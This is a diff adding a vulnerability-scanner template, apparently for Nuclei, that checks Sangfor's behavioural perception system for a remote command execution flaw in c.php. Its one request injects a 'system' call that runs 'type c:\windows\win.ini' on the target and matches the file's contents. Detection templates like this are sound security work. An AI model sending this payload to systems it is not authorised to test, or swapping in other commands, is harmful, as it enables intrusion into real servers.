@@ -1,0 +1,22 @@
+id: sangfor-behavioral-perception-system-c-php-rce
+info:
+  name: "深信服行为感知系统 c.php 远程命令执行漏洞"
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: Sangfor
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/tool/log/c.php?strip_slashes=system&host=type%20c:\\windows\\win.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "[files]"
+          - "bit app support"
+          - "Host"
+          - "Log Helper"
